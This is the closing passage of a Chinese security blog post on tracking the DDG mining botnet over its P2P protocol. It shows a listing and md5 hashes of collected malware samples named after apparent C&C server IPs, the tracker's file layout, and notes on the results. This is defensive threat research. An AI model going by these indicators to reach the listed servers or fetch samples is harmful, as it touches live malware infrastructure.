+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">➜ ll sample</div><div class="line">total 115M</div><div class="line">1.7K 104_236_156_211__8000__i_sh+8801aff2ec7c44bed9750f0659e4c533</div><div class="line">8.8M 104_236_156_211__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line"> 11M 104_236_156_211__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">1.8K 104_248_181_42__8000__i_sh+dc477d4810a8d3620d42a6c9f2e40b40</div><div class="line">3.6M 104_248_181_42__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">3.9M 104_248_181_42__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">1.9K 104_248_251_227__8000__i_sh+55ea97d94c6d74ceefea2ab9e1de4d9f</div><div class="line">3.6M 104_248_251_227__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">3.9M 104_248_251_227__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">1.1K 117_141_5_87__8000__i_sh+100d1048ee202ff6d5f3300e3e3c77cc</div><div class="line">1.7K 117_141_5_87__8000__i_sh+5760d5571fb745e7d9361870bc44f7a3</div><div class="line">8.8M 117_141_5_87__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line"> 11M 117_141_5_87__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">3.6M 117_141_5_87__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">3.9M 117_141_5_87__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">1.3K 119_9_106_27__8000__i_sh+09a3a0f662738279e344b2a38dc93ecb</div><div class="line">1.2K 119_9_106_27__8000__i_sh+9dc32a4a87d2b579d03b6adb27e3f604</div><div class="line">1.6K 119_9_106_27__8000__i_sh+b8a64e8bfe4a69c36760505cc757c38d</div><div class="line">3.6M 119_9_106_27__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">3.9M 119_9_106_27__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">9.4M 119_9_106_27__8000__static__3022__ddgs_i686+c32bd921a71d82696517c22021173480</div><div class="line"> 11M 119_9_106_27__8000__static__3022__ddgs_x86_64+79d762d1ff16142ea3bdae560558e718</div><div class="line">1.7K 132_148_241_138__8000__i_sh+44feb3cd31b957e24b18f97c46b57431</div><div class="line">1.1K 132_148_241_138__8000__i_sh+fcc003280d8e9060e00fb7273d8edee7</div><div class="line">8.8M 132_148_241_138__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line"> 11M 132_148_241_138__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">3.6M 132_148_241_138__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">3.9M 132_148_241_138__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">➜</div><div class="line">➜ md5sum sample/*</div><div class="line">8801aff2ec7c44bed9750f0659e4c533  104_236_156_211__8000__i_sh+8801aff2ec7c44bed9750f0659e4c533</div><div class="line">8c2e1719192caa4025ed978b132988d6  104_236_156_211__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line">d6187a44abacfb8f167584668e02c918  104_236_156_211__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">dc477d4810a8d3620d42a6c9f2e40b40  104_248_181_42__8000__i_sh+dc477d4810a8d3620d42a6c9f2e40b40</div><div class="line">3ebe43220041fe7da8be63d7c758e1a8  104_248_181_42__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">d894bb2504943399f57657472e46c07d  104_248_181_42__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">55ea97d94c6d74ceefea2ab9e1de4d9f  104_248_251_227__8000__i_sh+55ea97d94c6d74ceefea2ab9e1de4d9f</div><div class="line">3ebe43220041fe7da8be63d7c758e1a8  104_248_251_227__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">d894bb2504943399f57657472e46c07d  104_248_251_227__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">100d1048ee202ff6d5f3300e3e3c77cc  117_141_5_87__8000__i_sh+100d1048ee202ff6d5f3300e3e3c77cc</div><div class="line">5760d5571fb745e7d9361870bc44f7a3  117_141_5_87__8000__i_sh+5760d5571fb745e7d9361870bc44f7a3</div><div class="line">8c2e1719192caa4025ed978b132988d6  117_141_5_87__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line">d6187a44abacfb8f167584668e02c918  117_141_5_87__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">3ebe43220041fe7da8be63d7c758e1a8  117_141_5_87__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">d894bb2504943399f57657472e46c07d  117_141_5_87__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">09a3a0f662738279e344b2a38dc93ecb  119_9_106_27__8000__i_sh+09a3a0f662738279e344b2a38dc93ecb</div><div class="line">9dc32a4a87d2b579d03b6adb27e3f604  119_9_106_27__8000__i_sh+9dc32a4a87d2b579d03b6adb27e3f604</div><div class="line">b8a64e8bfe4a69c36760505cc757c38d  119_9_106_27__8000__i_sh+b8a64e8bfe4a69c36760505cc757c38d</div><div class="line">3ebe43220041fe7da8be63d7c758e1a8  119_9_106_27__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">d894bb2504943399f57657472e46c07d  119_9_106_27__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">c32bd921a71d82696517c22021173480  119_9_106_27__8000__static__3022__ddgs_i686+c32bd921a71d82696517c22021173480</div><div class="line">79d762d1ff16142ea3bdae560558e718  119_9_106_27__8000__static__3022__ddgs_x86_64+79d762d1ff16142ea3bdae560558e718</div><div class="line">44feb3cd31b957e24b18f97c46b57431  132_148_241_138__8000__i_sh+44feb3cd31b957e24b18f97c46b57431</div><div class="line">fcc003280d8e9060e00fb7273d8edee7  132_148_241_138__8000__i_sh+fcc003280d8e9060e00fb7273d8edee7</div><div class="line">8c2e1719192caa4025ed978b132988d6  132_148_241_138__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line">d6187a44abacfb8f167584668e02c918  132_148_241_138__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">3ebe43220041fe7da8be63d7c758e1a8  132_148_241_138__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">d894bb2504943399f57657472e46c07d  132_148_241_138__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div></pre></td></tr></table></figure>
+<p>综合以上描述，本地文件目录及文件示例如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">- ddg_tracker/</div><div class="line">|-- cc_server.list</div><div class="line">|-- log/</div><div class="line">|   |-- 20190123164450.log</div><div class="line">|   |-- 20190123180232.log</div><div class="line">|   |-- 20190123211837.log</div><div class="line">|   |-- 20190124000101.log</div><div class="line">|   |-- 20190124060101.log</div><div class="line">|   `-- ......</div><div class="line">|-- sample/</div><div class="line">|   |-- 104_236_156_211__8000__i_sh+8801aff2ec7c44bed9750f0659e4c533</div><div class="line">|   |-- 104_236_156_211__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line">|   |-- 104_236_156_211__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">|   |-- 104_248_181_42__8000__i_sh+dc477d4810a8d3620d42a6c9f2e40b40</div><div class="line">|   |-- 104_248_181_42__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">|   |-- 104_248_181_42__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">|   |-- 104_248_251_227__8000__i_sh+55ea97d94c6d74ceefea2ab9e1de4d9f</div><div class="line">|   |-- 104_248_251_227__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">|   |-- 104_248_251_227__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">|   |-- 117_141_5_87__8000__i_sh+100d1048ee202ff6d5f3300e3e3c77cc</div><div class="line">|   |-- 117_141_5_87__8000__i_sh+5760d5571fb745e7d9361870bc44f7a3</div><div class="line">|   |-- 117_141_5_87__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line">|   `-- ......</div><div class="line">`-- slave_conf/</div><div class="line">    |-- 104_236_156_211__20190123165004.raw</div><div class="line">    |-- 104_236_156_211__20190123185208.raw</div><div class="line">    |-- 104_236_156_211__20190123223044.raw</div><div class="line">    |-- 104_236_156_211__20190124012600.raw</div><div class="line">    |-- 132_148_241_138__20190224191449.raw</div><div class="line">    `-- ......</div></pre></td></tr></table></figure>
+<p>至此，我们就完成了 ddg 追踪程序的设计，为这个程序设置一个计划任务，定时运行一次即可。我个人的源码暂时不会放出来，有兴趣的朋友可以自己动手实现一下。目前的追踪成果(uniq peer ip):</p>
+<p><img src="/imgs/count_distinct_ip.png" style="zoom:50%"></p>
+<p>一次探测到的活跃节点数：</p>
+<p><img src="/imgs/latest_alive_bots.png" alt=""></p>
+<p>部分 DDG 更新的 Slack 消息推送：</p>
+<p><img src="/imgs/botnet_tracker_slack_msg.png" alt=""></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+<!--
+  <div style="MARGIN-TOP: 10px; FLOAT: left; MARGIN-LEFT: 5px; MARGIN-RIGHT: 10px">
+    <IMG alt="" src="https://avatars3.githubusercontent.com/u/4980416?v=3&s=140" width=120 height=120>
+  </div>
+ -->
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>Post author:</strong>
+      <a href="mailto:jiayu0x@gmail.com"> 0xjiayu </a>
+    </li>
+    <li class="post-copyright-link">
+      <strong>Post link:</strong>
+      <a href="http://jiayu0x.com/2019/04/11/track-ddg-botnet-by-p2p-protocol/" title="以 P2P 的方式追踪 DDG 僵尸网络">http://jiayu0x.com/2019/04/11/track-ddg-botnet-by-p2p-protocol/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>Copyright Notice: </strong>
+      All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/security/" rel="tag"># security</a>
+          
+            <a href="/tags/p2p/" rel="tag"># p2p</a>
+          
+            <a href="/tags/botnet/" rel="tag"># botnet</a>
+          
+            <a href="/tags/ddg/" rel="tag"># ddg</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/27/patch-bash5.0-for-deobfuscation/" rel="next" title="Patch Bash5.0，让 -x 只打印而不执行，静态解混淆 Shell 脚本">
+                <i class="fa fa-chevron-left"></i> Patch Bash5.0，让 -x 只打印而不执行，静态解混淆 Shell 脚本
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="0xjiayu" />
+          <p class="site-author-name" itemprop="name">0xjiayu</p>
+           
+              <p class="site-description motion-element" itemprop="description">About Security/Coding…… and life.</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">16</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">26</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-概述"><span class="nav-number">1.</span> <span class="nav-text">1. 概述</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-Botnet-及其网络结构"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 Botnet 及其网络结构</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-1-Botnet-简介"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.1.1 Botnet 简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-2-传统-Botnet"><span class="nav-number">1.1.2.</span> <span class="nav-text">1.1.2 传统 Botnet</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-3-P2P-Botnet"><span class="nav-number">1.1.3.</span> <span class="nav-text">1.1.3 P2P Botnet</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-4-挖矿僵尸网络"><span class="nav-number">1.1.4.</span> <span class="nav-text">1.1.4 挖矿僵尸网络</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-对-Botnet-的处置措施"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 对 Botnet 的处置措施</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-DDG-Mining-Botnet"><span class="nav-number">2.</span> <span class="nav-text">2. DDG.Mining.Botnet</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-ddg-的网络结构"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 ddg 的网络结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-ddg-的-C-amp-C-服务器"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 ddg 的 C&C 服务器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-ddg-的云端配置数据"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 ddg 的云端配置数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-ddg-的-P2P-节点"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 ddg 的 P2P 节点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-追踪程序设计"><span class="nav-number">3.</span> <span class="nav-text">3. 追踪程序设计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-追踪程序的执行流程"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 追踪程序的执行流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-加入-P2P-网络"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 加入 P2P 网络</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-获取并解析最新的-Peers-List"><span class="nav-number">3.3.</span> <span class="nav-text">3.3 获取并解析最新的 Peers List</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-保存-Peers-信息"><span class="nav-number">3.4.</span> <span class="nav-text">3.4 保存 Peers 信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-探测最新活跃的-C-amp-C，拉取最新的配置数据"><span class="nav-number">3.5.</span> <span class="nav-text">3.5 探测最新活跃的 C&C，拉取最新的配置数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-6-下载最新样本"><span class="nav-number">3.6.</span> <span class="nav-text">3.6 下载最新样本</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0xjiayu</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://jiayu0x.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://jiayu0x.com/2019/04/11/track-ddg-botnet-by-p2p-protocol/';
+          this.page.identifier = '2019/04/11/track-ddg-botnet-by-p2p-protocol/';
+          this.page.title = '以 P2P 的方式追踪 DDG 僵尸网络';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://jiayu0x.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+
+</body>
+</html>
